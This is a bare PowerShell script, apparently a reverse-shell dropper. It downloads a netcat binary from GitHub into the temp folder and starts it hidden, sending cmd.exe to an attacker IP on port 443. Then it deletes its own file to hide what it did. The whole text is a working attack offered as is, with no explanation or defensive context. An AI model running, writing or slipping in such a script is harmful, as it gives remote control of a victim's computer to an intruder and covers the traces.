
[Net.ServicePointManager]::SecurityProtocol = 'Tls12'

# settting
$ncUrl      = "https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/nc.exe"
$ncPath     = "$env:TEMP\nc.exe"
$attackerIP = "192.168.1.104"
$port       = "443"

# Nc Download
try {
    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
} catch {
    exit 1
}

# Reverse Shell 
if (Test-Path $ncPath) {
    Start-Process -FilePath $ncPath -ArgumentList "$attackerIP $port -e cmd.exe" -WindowStyle Hidden -NoNewWindow
}

# logical
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    Start-Sleep -Seconds 2
    Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
}
